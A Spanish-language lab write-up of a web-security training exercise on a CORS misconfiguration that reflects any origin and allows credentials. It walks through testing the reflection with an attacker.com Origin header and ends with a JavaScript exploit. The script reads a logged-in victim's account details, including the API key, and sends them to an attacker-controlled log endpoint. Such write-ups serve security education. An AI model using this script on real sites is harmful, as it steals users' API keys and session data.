# Lab: CORS vulnerability with basic origin reflection

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

![Practitioner](https://img.shields.io/badge/level-Apprentice-green) 

---

Iniciamos el laboratorio y nos encontramos con un sitio de compras online:
![image](https://github.com/user-attachments/assets/27097d64-5cfd-42ac-882e-a8d2e4704b4f)

Tenemos que acceder a algun endpoint que nos permita visualizar nuestra API key, por lo que procedemos a autenticarnos con nuestras credenciales `wiener:peter`:
![image](https://github.com/user-attachments/assets/6aac9bd4-4886-4833-a96d-762e03af1942)

Dashboard del usuario `wiener`:
![image](https://github.com/user-attachments/assets/08d91dd3-eace-4c2d-a73d-adb1b5e7426b)

Notamos que además tramita un endpoint interesante:
![image](https://github.com/user-attachments/assets/3d1cff9f-aaa0-4f4a-a5b2-a3e2c427323b)

El endpoint `/accountDetails` muestra una configuración vulnerable a CORS con reflexión de origen, y la imagen demuestra claramente que la explotación es posible. 
La solicitud GET a `/accountDetails` devuelve información sensible del usuario autenticado:
```json
{
  "username": "wiener",
  "email": "",
  "apikey": "KNOtNNLqwPrDs2yrDB1WSo909dr1VGaE",
  "sessions": [...]
}
```
Y el encabezado de respuesta:
```http
Access-Control-Allow-Credentials: true
```

Esto permite que el navegador envíe cookies en solicitudes cross-origin.

Esto es inseguro si el servidor también refleja el origen (`Origin`) sin validación.

Para validar esto, enviamos esta solicitud al `Repeater` y añadimos una nueva cabecera `Origin: https://attacker.com`, la respuesta incluirá:
```http
Access-Control-Allow-Origin: https://attacker.com
```

Realizamos la prueba, esta nueva captura confirmá que el sitio es vulnerable a una explotación CORS con reflexión de origen:
![image](https://github.com/user-attachments/assets/5231fe33-2b1f-4d25-a0c2-ec335fa74439)

- El servidor está reflejando dinámicamente el origen proporcionado (https://attacker.com).

- Y permite el uso de cookies/autenticación (Access-Control-Allow-Credentials: true).

Un atacante puede desde su propio dominio malicioso (attacker.com) hacer una solicitud autenticada con cookies del usuario víctima a `/accountDetails`, y robar la API key y otros datos privados.

Procedemos a utilizar un script:
```javascript
var req = new XMLHttpRequest();
req.onload = function() {
    location='/log?data=' + this.responseText;
};
req.open('GET', 'https://0af80099040020e7ec49840800a3004f.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.send();
```





